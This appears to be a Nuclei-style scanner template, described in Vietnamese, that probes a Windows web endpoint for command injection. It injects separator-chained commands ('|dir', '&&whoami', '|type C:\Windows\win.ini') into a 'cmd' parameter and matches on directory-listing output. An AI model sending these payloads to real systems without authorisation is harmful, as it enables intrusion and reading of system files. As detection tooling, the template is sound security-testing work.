id: windows-command-injection

info:
  name: Windows Command Injection Test
  severity: critical
  description: "Kiểm tra command injection trên hệ thống Windows"

http:
  - method: GET
    path: "{{BaseURL}}/run?cmd={{payload}}"
    
    payloads:
      payload:
        - "|dir"
        - ";dir"
        - "&&dir"
        - "||dir"
        - "|type C:\\Windows\\win.ini"
        - "&&whoami"

    matchers:
      - type: word
        words:
          - "Directory of"
          - "Volume in drive"
          - "Volume Serial Number"
          - "[extensions]"
        condition: or